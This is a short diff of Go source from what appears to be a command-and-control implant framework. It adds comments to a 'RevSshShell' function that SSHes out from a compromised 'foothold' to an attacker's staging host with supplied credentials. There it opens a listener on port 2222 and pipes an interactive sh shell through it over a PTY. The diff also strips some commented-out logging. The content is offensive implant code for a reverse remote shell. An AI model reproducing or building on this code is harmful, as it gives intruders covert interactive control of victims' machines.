@@ -21,6 +21,10 @@ import (
 	"fmt"
 )
 
+/*
+This JSON Object definition is needed in some Implants Modules to decode parameters
+Hive will have the same definitions in: ./src/hive/hiveJobs.go
+*/
 type InjectRevSshShellBichito struct {
     Domain string   `json:"domain"`
     Sshkey string   `json:"sshkey"`
@@ -28,7 +32,14 @@ type InjectRevSshShellBichito struct {
     User string   `json:"user"`
 }
 
-
+/*
+Description: Inject Reverse Shell --> Linux,Darwin
+Flow:
+A.Use golang ssh native library to spawn a ssh client that connects to a target staging
+	A1.Use provided credentials (username and pem key), for the ssh connection
+B.This connection will create a listener in 2222 localport of target staging
+C.Spawn a sh process within the foothold, and pipe stdout/stdin(tty) through this last opened socket
+*/
 func RevSshShell(jsonparams string) (bool,string){
 
 	//Debug
@@ -101,7 +112,6 @@ func handleConnection(c net.Conn) {
 	// Create PTY
 	pty, tty, err := pty.Open()
 	if err != nil {
-		//log.Printf("error: could not open PTY: %s", err)
 		return
 	}
 	defer tty.Close()
@@ -110,7 +120,6 @@ func handleConnection(c net.Conn) {
 	// Put the TTY into raw mode
 	_, err = terminal.MakeRaw(int(tty.Fd()))
 	if err != nil {
-		//log.Printf("warn: could not make TTY raw: %s", err)
 	}
 
 	// Hook everything up
@@ -127,7 +136,6 @@ func handleConnection(c net.Conn) {
 	// Start command
 	err = cmd.Start()
 	if err != nil {
-		//log.Printf("error: could not start command: %s", err)
 		return
 	}
 
